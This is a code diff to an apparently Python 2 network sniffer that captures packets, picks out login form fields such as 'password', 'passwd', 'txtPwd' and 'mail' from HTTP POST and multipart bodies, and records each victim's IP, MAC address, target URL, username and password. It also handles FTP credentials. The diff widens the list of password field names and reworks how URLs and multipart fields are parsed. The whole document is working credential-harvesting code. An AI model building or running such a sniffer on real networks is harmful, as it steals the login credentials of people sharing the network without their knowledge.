@@ -4,6 +4,7 @@ import pcap
 import re
 import socket
 import urlparse
+import cgi
 import binascii
 import signal
 import sys
@@ -34,18 +35,6 @@ class Sniffer(object):
         self.devices_mac = {}
         self.info_counter = 0
 
-    def _is_host(self, content):
-        regex = re.compile('Host: (.*)')
-        return content is not None and regex.search(content)
-
-    def _is_pwd(self, content):
-        regex = re.compile('(.*)[password]=(.*)')
-        return content is not None and regex.search(content)
-
-    def _is_pwd_with_txt(self, content):
-        regex = re.compile('(.*)[txtPwd]=(.*)')
-        return content is not None and regex.search(content)
-
     def _pick_ftp_info(self, data, client, server, dport, eth_src):
         self.devices_mac.setdefault(add_colons_to_mac(eth_src), {})
 
@@ -70,11 +59,12 @@ class Sniffer(object):
 
             del self.devices_mac[add_colons_to_mac(eth_src)]
 
-    def _pick_http_info(self, tcpdata, data, client, server, dport, eth_src):
+    def _pick_http_info(self, url, data, client, server, dport, eth_src):
         self.info_counter += 1
         self.all_user_info[self.info_counter] = (
             {'client': client, 'server': server,
              'app': APP.get(dport),
+             'url': url,
              'mac': add_colons_to_mac(binascii.hexlify(eth_src))}
         )
 
@@ -88,7 +78,7 @@ class Sniffer(object):
             else:
                 self.all_user_info[self.info_counter].update({'login': None})
 
-        for passwd_field in ['password', 'os_password', 'passwd', 'txtPwd', 'u_passwd', 'u_password', 'userPass', 'member.userPwd']:
+        for passwd_field in ['password', 'os_password', 'passwd', 'txtPwd', 'u_passwd', 'u_password', 'userPass', 'member.userPwd', 'pwd']:
             passwd_data = data.get(passwd_field)
             if passwd_data:
                 self.all_user_info[self.info_counter].update(
@@ -96,17 +86,6 @@ class Sniffer(object):
                 break
             else:
                 self.all_user_info[self.info_counter].update({'password': None})
-
-        try:
-            headers = dict(re.findall(r"(?P<name>.*?): (?P<value>.*?)\r\n", tcpdata))
-            if headers['Origin']:
-                self.all_user_info[self.info_counter].update({'url':headers['Origin']})
-            elif headers['Referer']:
-                self.all_user_info[self.info_counter].update({'url':headers['Referer']})
-            elif headers['Host']:
-                self.all_user_info[self.info_counter].update({'url':headers['Host']})
-        except:
-            pass
 
         print "HTTP New Password get:"
         pprint(self.all_user_info[self.info_counter])
@@ -151,7 +130,6 @@ class Sniffer(object):
         try:
             http_req = dpkt.http.Request(tcp_pkt.data)
             if http_req.method == 'POST':
-                print "This is POST method"
                 pass
         except dpkt.dpkt.UnpackError:
             pass
@@ -159,26 +137,46 @@ class Sniffer(object):
         for data_field in ['mail', 'passw', 'password', 'os_password', 'passwd',
                             'txtPwd', 'u_passwd', 'u_password', 'userPass', 'member.userPwd']:
             if data_field in tcp_pkt.data:
-                print "found data field by: %s" %data_field
-                if 'POST' in tcp_pkt.data:
-                    print "this is post data"
-                    pwd_obj = self._is_pwd(tcp_pkt.data)
-                    if pwd_obj:
-                        qs_d = urlparse.parse_qs(pwd_obj.group(0))
-                        if not qs_d:
-                            qs_d = urlparse.parse_qs(tcp_pkt.data)
+                print "found data field: %s" % data_field
+                try:
+                    headers = dict(re.findall(r"(?P<name>.*?): (?P<value>.*?)\r\n", tcp_pkt.data))
+                except:
+                    headers = None
+                try:
+                    if headers['Origin']:
+                        url = headers['Origin']
+                    elif headers['Referer']:
+                        url = headers['Referer']
+                    elif headers['Host']:
+                        url = headers['Host']
+                except:
+                    url = 'None'
+
+                try:
+                    disposition = headers['Content-Disposition']
+                except:
+                    disposition = None
+
+                if '\r\n' in tcp_pkt.data:
+                    datas = tcp_pkt.data.split('\r\n')
                 else:
-                    print "not post data"
+                    datas = tcp_pkt.data.split('\n')
+                if disposition:
+                    qs_d = {}
+                    data = datas[len(datas)-1:]
+                    ctype, pdict = cgi.parse_header(disposition)
+                    qs_d[pdict['name']] = data
+                else:
                     qs_d = urlparse.parse_qs(tcp_pkt.data)
             else:
                 continue
 
             if qs_d:
-                print "qs_d found %s in %s" % (qs_d, tcp_pkt.data)
+                #print "qs_d found %s in %s" % (qs_d, tcp_pkt.data)
                 break
 
         if qs_d:
-            self._pick_http_info(tcp_pkt.data, qs_d, socket.inet_ntoa(ip_pkt.src),
+            self._pick_http_info(url, qs_d, socket.inet_ntoa(ip_pkt.src),
                                  socket.inet_ntoa(ip_pkt.dst),
                                  tcp_pkt.dport, eth_pkt.src)
         else:
